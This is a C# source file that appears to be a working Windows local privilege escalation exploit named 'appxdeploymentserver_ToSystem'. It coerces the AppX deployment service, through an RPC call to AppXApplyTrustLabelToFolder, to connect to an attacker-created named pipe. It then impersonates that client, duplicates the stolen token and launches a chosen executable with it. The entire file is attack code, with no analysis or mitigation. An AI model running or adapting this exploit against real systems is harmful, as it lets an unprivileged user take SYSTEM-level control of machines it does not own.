using System;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Threading;
using rpc_ae2dc901_312d_41df_8b79_e835e63db874_1_0;
using NtApiDotNet;
using NtApiDotNet.Ndr.Marshal;
using NtApiDotNet.Win32;
using System.ServiceProcess;
using System.ComponentModel;

namespace appxdeploymentserver_ToSystem
{
    class createprogress
    {
        [DllImport("advapi32.dll", EntryPoint = "ImpersonateNamedPipeClient")]
        public static extern int ImpersonateNamedPipeClient(
            IntPtr hNamedPipe
    );
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;

        }

        internal enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        internal enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }



        [StructLayout(LayoutKind.Sequential)]
        internal struct SECURITY_ATTRIBUTES
        {
            public uint nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }


        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle,
            UInt32 DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        Int32 dwDesiredAccess,
        ref SECURITY_ATTRIBUTES lpThreadAttributes,
        Int32 ImpersonationLevel,
        Int32 dwTokenType,
        ref IntPtr phNewToken);

        [DllImport("advapi32.dll", EntryPoint = "CreateProcessWithTokenW", SetLastError = true,
                             CharSet = CharSet.Unicode,
                             CallingConvention = CallingConvention.StdCall)]
        private extern static bool CreateProcessWithTokenW(
            IntPtr hToken,
            uint dwLogonFlags,
            String lpApplicationName,
            String lpCommandLine,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            String lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("KERNEL32", SetLastError = true)]
        [ResourceExposure(ResourceScope.None)]
        internal static extern IntPtr
            GetCurrentThread();

        [DllImport("ADVAPI32", SetLastError = true, EntryPoint = "OpenThreadToken")]
        [ResourceExposure(ResourceScope.None)]
        internal static extern bool
            OpenCurrentThreadToken(
                [In] IntPtr ThreadHandle,
                [In] UInt32 DesiredAccess,
                [In] bool OpenAsSelf,
                [Out] out IntPtr TokenHandle);


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        private const int GENERIC_ALL_ACCESS = 0x10000000;

        public const uint LOGON_WITH_PROFILE = 00000001;
        public const uint NORMAL_PRIORITY_CLASS = 0x00000020;
        private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
        private static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        private static uint STANDARD_RIGHTS_READ = 0x00020000;
        private static uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private static uint TOKEN_DUPLICATE = 0x0002;
        private static uint TOKEN_IMPERSONATE = 0x0004;
        private static uint TOKEN_QUERY = 0x0008;
        private static uint TOKEN_QUERY_SOURCE = 0x0010;
        private static uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private static uint TOKEN_ADJUST_GROUPS = 0x0040;
        private static uint TOKEN_ADJUST_DEFAULT = 0x0080;
        private static uint TOKEN_ADJUST_SESSIONID = 0x0100;
        private static uint TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        private static uint TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
            TOKEN_ADJUST_SESSIONID);

        public static void impersonateHandle(IntPtr hpipe)
        {
            int a = ImpersonateNamedPipeClient(hpipe);
            if (a == 0)
            {
                Console.WriteLine("[!] failed imporsonate namedpipe");
            }
            else
            {
                Console.WriteLine(a);
                Console.WriteLine("[+] success imporsonate namedpipe");
            };
        }

        public static int CreateProcessbytoken()
        {
            IntPtr tokenhandle = IntPtr.Zero;
            if (!OpenCurrentThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, out tokenhandle))
            {
                Console.WriteLine("[!] failed open process token");
                return 100;
                //Console.WriteLine(OpenThreadToken((IntPtr)calcProcess, TOKEN_ADJUST_PRIVILEGES, false, out tokenhandle));
            };
            IntPtr newtoken = IntPtr.Zero;
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();


            if (!DuplicateTokenEx(tokenhandle, (int)(TOKEN_ALL_ACCESS), ref sa, (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, (int)TOKEN_TYPE.TokenPrimary, ref newtoken))
            {
                Console.WriteLine((int)(TOKEN_ALL_ACCESS));
                Console.WriteLine(TOKEN_ALL_ACCESS);
                Console.WriteLine("[!] failed duplicating process token ");
                int error = Marshal.GetLastWin32Error();
                string message = String.Format("DuplicateTokenEx Error: {0}", error);
                Console.WriteLine(message);
                return 101;
            }
            Console.WriteLine("[+] success duplicating process token ");


            string processpath;
            processpath = "c:\\test\\justbox.exe";


            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();


            if (!CreateProcessWithTokenW(newtoken, LOGON_WITH_PROFILE, null, processpath, NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT, IntPtr.Zero, null, ref si, out pi))
            {
                Console.WriteLine("[!] failed create process with token ");
                int error = Marshal.GetLastWin32Error();
                string message = String.Format("CreateProcessWithTokenW Error: {0}", error);
                Console.WriteLine(message);
                return 102;
            }

            Console.WriteLine("[+] success create process with token");

            return 103;
        }
        static void StartAppinfoService()
        {
            try
            {
                ServiceController service = new ServiceController("appinfo");
                if (service.Status != ServiceControllerStatus.Running)
                {
                    service.Start();
                    service.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(5));
                }
            }
            catch
            {
            }
        }
        public static void call_pipe_service()
        {
            StartAppinfoService();

            using (Client client = new Client())
            {
                client.Connect();
                int i = 0;
                try
                {
                    int retval = client.AppXApplyTrustLabelToFolder_58("\\\\localhost\\pipe\\testpipe", "aa");
                    if (retval != 0)
                    {
                        throw new Win32Exception(retval);
                    }
                }
                catch (IOException e)
                {
                    Console.WriteLine("Calling function AppXApplyTrustLabelToFolder_59");
                }

            }
        }


    }
    class Program
    {
        private static int numThreads = 4;

        private static void ServerThread(object data)
        {
            NamedPipeServerStream pipeServer =
                new NamedPipeServerStream("testpipe", PipeDirection.InOut, numThreads);

            int threadId = Thread.CurrentThread.ManagedThreadId;

            // Wait for a client to connect
            pipeServer.WaitForConnection();



            Console.WriteLine("Client connected on thread[{0}].", threadId);
            try
            {
                IntPtr hpipe = pipeServer.SafePipeHandle.DangerousGetHandle();
                //Console.WriteLine(hpipe);
                createprogress.impersonateHandle(hpipe);
                
                createprogress.CreateProcessbytoken();

            }
            // Catch the IOException that is raised if the pipe is broken
            // or disconnected.
            catch
            {

            }
            //pipeServer.Close();
        }
        public static void Main()
        {

            int i;
            Thread[] servers = new Thread[numThreads];
            Console.WriteLine("Creating Namepipe...\n");

            for (i = 0; i < numThreads; i++)
            {
                servers[i] = new Thread(ServerThread);
                servers[i].Start();
                createprogress.call_pipe_service();
            }
            Thread.Sleep(250);
            while (i > 0)
            {
                for (int j = 0; j < numThreads; j++)
                {
                    if (servers[j] != null)
                    {
                        if (servers[j].Join(250))
                        {
                            Console.WriteLine("Server thread[{0}] finished.", servers[j].ManagedThreadId);
                            servers[j] = null;
                            i--;    // decrement the thread watch count
                        }
                    }
                }
            }
            Console.WriteLine("\nServer threads exhausted, exiting.");
        }
    }
}